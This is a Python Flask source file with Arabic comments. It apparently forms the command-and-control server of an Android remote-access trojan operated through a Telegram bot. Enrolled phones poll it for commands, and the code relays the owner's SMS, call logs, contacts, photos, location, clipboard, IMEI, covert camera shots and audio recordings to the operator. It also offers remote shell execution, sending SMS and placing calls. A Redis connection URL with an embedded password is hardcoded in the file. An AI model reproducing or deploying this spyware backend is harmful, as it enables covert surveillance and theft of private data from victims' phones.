# apk_manager.py
# ============================================================
# APK Manager — إدارة الأجهزة المتصلة + 25+ أمر
# ============================================================

import os
import io
import json
import time
import uuid
import random
import string
import base64
import threading
import redis
from flask import Blueprint, request, jsonify
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

apk_bp = Blueprint('apk_manager', __name__)

# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] APK Manager: Redis connected")
except Exception as e:
    print(f"[-] APK Manager Redis error: {e}")
    redis_client = None


# ============================================================
# البيانات في الذاكرة
# ============================================================
apk_devices = {}
apk_commands = {}
apk_lock = threading.Lock()


# ============================================================
# إدارة الأكواد
# ============================================================
def create_apk_code(chat_id):
    if not redis_client:
        return None
    try:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        redis_client.setex(f"apk_code:{code}", 86400 * 30, str(chat_id))
        print(f"[+] APK code created: {code} -> {chat_id}")
        return code
    except Exception as e:
        print(f"[-] create_apk_code error: {e}")
        return None


def get_apk_code(code):
    if not redis_client:
        return None
    try:
        return redis_client.get(f"apk_code:{code}")
    except Exception:
        return None


# ============================================================
# إدارة الأجهزة
# ============================================================
def get_apk_devices():
    with apk_lock:
        return list(apk_devices.values())


def get_apk_device(device_id):
    with apk_lock:
        return apk_devices.get(device_id)


def push_apk_command(device_id, action, **kwargs):
    cmd = {"action": action}
    cmd.update(kwargs)
    with apk_lock:
        if device_id not in apk_commands:
            apk_commands[device_id] = []
        apk_commands[device_id].append(cmd)
        print(f"[+] APK PUSH: {device_id[:8]} -> {action}")
    return True


# ============================================================
# ★★★ لوحة التحكم الشاملة — 25+ أمر ★★★
# ============================================================
def build_apk_panel(device_id):
    m = InlineKeyboardMarkup()
    
    # 📸 الكاميرا
    m.row(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"apk_cmd_camera_front_{device_id}"),
        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"apk_cmd_camera_back_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 تسجيل فيديو", callback_data=f"apk_cmd_camera_record_{device_id}"),
    )
    
    # 🎙️ الصوت
    m.row(
        InlineKeyboardButton("🎙️ تسجيل صوتي 10s", callback_data=f"apk_cmd_record_audio_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🔔 نغمة إشعار", callback_data=f"apk_cmd_play_sound_{device_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"apk_cmd_play_alarm_{device_id}"),
    )
    
    # 📊 البيانات
    m.row(
        InlineKeyboardButton("📱 معلومات", callback_data=f"apk_cmd_info_{device_id}"),
        InlineKeyboardButton("🔋 بطارية", callback_data=f"apk_cmd_battery_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"apk_cmd_sms_{device_id}"),
        InlineKeyboardButton("📞 المكالمات", callback_data=f"apk_cmd_calls_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"apk_cmd_contacts_{device_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"apk_cmd_apps_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"apk_cmd_photos_{device_id}"),
        InlineKeyboardButton("📍 الموقع", callback_data=f"apk_cmd_location_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 الحافظة", callback_data=f"apk_cmd_clipboard_{device_id}"),
    )
    
    # 🎮 التحكم
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"apk_cmd_vibrate_{device_id}"),
        InlineKeyboardButton("🔊 رفع الصوت", callback_data=f"apk_cmd_volume_max_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("💬 رسالة Toast", callback_data=f"apk_cmd_toast_{device_id}"),
        InlineKeyboardButton("💻 أمر Shell", callback_data=f"apk_cmd_shell_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🔒 قفل الشاشة", callback_data=f"apk_cmd_lock_screen_{device_id}"),
        InlineKeyboardButton("🏠 الشاشة الرئيسية", callback_data=f"apk_cmd_show_home_{device_id}"),
    )
    
    # 📨 إرسال
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"apk_cmd_send_sms_{device_id}"),
        InlineKeyboardButton("📞 بدء مكالمة", callback_data=f"apk_cmd_call_{device_id}"),
    )
    
    # 🌐 فتح رابط
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"apk_cmd_open_url_{device_id}"),
    )
    
    return m


# ============================================================
# Routes
# ============================================================
def init_apk_routes(app, bot):

    # ============================================================
    # ★ اختبار الاتصال ★
    # ============================================================
    @app.route('/apk/test', methods=['GET'])
    def apk_test():
        code = request.args.get('code', '')
        device = request.args.get('device', '')
        print(f"[TEST] APK connected! Code: {code} | Device: {device[:16]}")
        
        if code and code != "DEFAULT":
            try:
                chat_id = get_apk_code(code)
                if chat_id:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"🔗 **اختبار اتصال ناجح!**\n"
                        f"🔑 الكود: `{code}`\n"
                        f"📱 Device: `{device[:16]}`\n"
                        f"✅ APK يتصل بالسيرفر بنجاح",
                        parse_mode="Markdown"
                    )
            except Exception as e:
                print(f"[-] test notify error: {e}")
        
        return jsonify({"status": "ok", "message": "APK connected!"}), 200

    # ============================================================
    # ★ التحقق من كود التنشيط ★
    # ============================================================
    @app.route('/apk/verify', methods=['POST'])
    def apk_verify():
        try:
            data = request.get_json(silent=True) or {}
            code = data.get("code", "").strip().upper()
            device_model = data.get("device_model", "")
            device_brand = data.get("device_brand", "")
            
            if not code:
                return jsonify({"valid": False}), 200
            
            chat_id = get_apk_code(code)
            
            if chat_id:
                print(f"[+] APK verified: {code} -> {chat_id} | {device_brand} {device_model}")
                
                try:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"✅ **تم تفعيل جهاز جديد!**\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🔑 الكود: `{code}`\n"
                        f"📦 الموديل: `{device_brand} {device_model}`\n\n"
                        f"⏳ في انتظار البيانات...",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    print(f"[-] notify error: {e}")
                
                return jsonify({"valid": True, "chat_id": str(chat_id)}), 200
            else:
                print(f"[-] Invalid APK code: {code}")
                return jsonify({"valid": False}), 200
        except Exception as e:
            print(f"[-] apk_verify error: {e}")
            return jsonify({"valid": False}), 200

    # ============================================================
    # ★ Polling للأوامر ★
    # ============================================================
    @app.route('/apk/poll', methods=['GET'])
    def apk_poll():
        device_id = request.args.get('device', '')
        code = request.args.get('code', '').upper()
        
        if not device_id:
            return jsonify({"commands": []}), 200
        
        with apk_lock:
            if device_id not in apk_devices:
                chat_id = get_apk_code(code) if code else None
                if not chat_id:
                    chat_id = code
                
                apk_devices[device_id] = {
                    "device_id": device_id,
                    "chat_id": chat_id,
                    "code": code,
                    "first_seen": time.time(),
                    "last_seen": time.time(),
                    "info": {},
                }
                print(f"[+] New APK device connected: {device_id[:16]} | code={code}")
                
                if chat_id:
                    try:
                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                        bot.send_message(
                            cid,
                            f"🎯 **جهاز جديد بدأ الاتصال!**\n"
                            f"🆔 `{device_id[:16]}`\n"
                            f"🔑 الكود: `{code}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        print(f"[-] notify error: {e}")
            
            apk_devices[device_id]["last_seen"] = time.time()
        
        commands = []
        with apk_lock:
            if device_id in apk_commands:
                commands = apk_commands[device_id]
                apk_commands[device_id] = []
        
        if commands:
            print(f"[+] Sending {len(commands)} commands to {device_id[:8]}")
        
        return jsonify({"commands": commands}), 200

    # ============================================================
    # ★ استقبال البيانات ★
    # ============================================================
    @app.route('/apk/data', methods=['POST'])
    def apk_data():
        try:
            data = request.get_json(silent=True) or {}
            device_id = data.get("device", "")
            code = data.get("code", "").upper()
            dtype = data.get("type", "")
            
            print(f"[APK DATA] type={dtype} | device={device_id[:16] if device_id else 'None'}")
            
            if not device_id:
                return jsonify({"status": "no_device"}), 200
            
            chat_id = None
            with apk_lock:
                if device_id in apk_devices:
                    chat_id = apk_devices[device_id].get("chat_id")
            
            if not chat_id and code:
                chat_id = get_apk_code(code)
            
            if not chat_id:
                print(f"[-] APK data with no chat_id")
                return jsonify({"status": "no_chat"}), 200
            
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            
            # ============================================================
            # initial
            # ============================================================
            if dtype == "initial":
                with apk_lock:
                    if device_id in apk_devices:
                        apk_devices[device_id]["info"] = data
                
                text = (
                    f"🆕 **جهاز جديد متصل!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 **الموديل:** `{data.get('model', 'N/A')}`\n"
                    f"🏭 **الشركة:** `{data.get('manufacturer', 'N/A')}`\n"
                    f"📱 **Android:** `{data.get('android', 'N/A')}`\n"
                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
                    f"🎛️ **لوحة التحكم:**"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                bot.send_message(cid, "اختر الأمر:",
                    reply_markup=build_apk_panel(device_id))
            
            # ============================================================
            # معلومات الجهاز
            # ============================================================
            elif dtype == "device_info":
                text = (
                    f"📱 **معلومات الجهاز**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 `{data.get('model')}`\n"
                    f"📞 IMEI: `{data.get('imei', 'N/A')}`\n"
                    f"📶 المشغل: `{data.get('operator', 'N/A')}`\n"
                    f"🌍 الدولة: `{data.get('country', 'N/A')}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
            
            # ============================================================
            # البطارية
            # ============================================================
            elif dtype == "battery":
                text = (
                    f"🔋 **البطارية**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📊 المستوى: `{data.get('level', 'N/A')}%`\n"
                    f"⚡ الحالة: `{'يشحن' if data.get('charging') else 'لا يشحن'}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
            
            # ============================================================
            # SMS
            # ============================================================
            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, "📭 لا توجد رسائل")
                else:
                    lines = ["📨 **الرسائل SMS:**", "━━━━━━━━━━━━━━━"]
                    for s in sms_list[:20]:
                        lines.append(f"📩 `{s.get('from')}`:\n{s.get('body', '')[:200]}\n─")
                    msg = "\n".join(lines)
                    for i in range(0, len(msg), 4000):
                        bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            # ============================================================
            # المكالمات
            # ============================================================
            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = ["📞 **سجل المكالمات:**", "━━━━━━━━━━━━━━━"]
                for c in calls[:20]:
                    t = type_map.get(str(c.get('type', '')), '؟')
                    lines.append(f"{t} `{c.get('number')}` ({c.get('duration')}s)")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
            
            # ============================================================
            # جهات الاتصال
            # ============================================================
            elif dtype == "contacts":
                contacts = data.get("contacts", [])
                lines = [f"👥 **جهات الاتصال ({len(contacts)}):**", "━━━━━━━━━━━━━━━"]
                for c in contacts[:50]:
                    lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            # ============================================================
            # التطبيقات
            # ============================================================
            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [f"📲 **التطبيقات ({len(apps)}):**", "━━━━━━━━━━━━━━━"]
                for a in apps[:60]:
                    lines.append(f"• {a.get('name')}")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            # ============================================================
            # الصور
            # ============================================================
            elif dtype == "photos":
                photos = data.get("photos", [])
                lines = [f"🖼️ **الصور ({len(photos)}):**"]
                for p in photos[:20]:
                    lines.append(f"• `{p.get('path')}`")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
            
            # ============================================================
            # الموقع
            # ============================================================
            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    bot.send_message(cid,
                        f"📍 **الموقع:**\n`{lat}, {lng}`\n"
                        f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                        parse_mode="Markdown")
                else:
                    bot.send_message(cid, "❌ لا يوجد موقع")
            
            # ============================================================
            # الحافظة
            # ============================================================
            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(cid, f"📋 **الحافظة:**\n```\n{text[:500]}\n```",
                        parse_mode="Markdown")
                else:
                    bot.send_message(cid, "📋 الحافظة فارغة")
            
            # ============================================================
            # 📸 صورة من الكاميرا
            # ============================================================
            elif dtype == "camera_photo":
                image_data = data.get("image", "")
                camera_name = data.get("camera_name", "")
                
                if image_data and image_data.startswith("data:image"):
                    try:
                        _, encoded = image_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(img_bytes)
                        buf.name = f"camera_{camera_name}.jpg"
                        
                        caption = f"📸 **صورة من الكاميرا {'الأمامية' if camera_name == 'front' else 'الخلفية'}**"
                        bot.send_photo(cid, buf, caption=caption, parse_mode="Markdown")
                    except Exception as e:
                        bot.send_message(cid, f"❌ فشل إرسال الصورة: {e}")
                else:
                    bot.send_message(cid, "❌ لم يتم استلام صورة")
            
            # ============================================================
            # 🎙️ تسجيل صوتي
            # ============================================================
            elif dtype == "audio_record":
                audio_data = data.get("audio", "")
                duration = data.get("duration", 0)
                
                if audio_data and audio_data.startswith("data:audio"):
                    try:
                        _, encoded = audio_data.split(",", 1)
                        aud_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(aud_bytes)
                        buf.name = "record.3gp"
                        
                        caption = f"🎙️ **تسجيل صوتي ({duration}ms)**"
                        bot.send_audio(cid, buf, caption=caption, parse_mode="Markdown")
                    except Exception as e:
                        bot.send_message(cid, f"❌ فشل إرسال الصوت: {e}")
                else:
                    bot.send_message(cid, "❌ لم يتم استلام صوت")
            
            # ============================================================
            # Shell Result
            # ============================================================
            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(cid,
                    f"💻 **نتيجة:**\n`{cmd}`\n\n```\n{output[:2000]}\n```",
                    parse_mode="Markdown")
            
            elif dtype == "heartbeat":
                pass
            
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] apk_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200
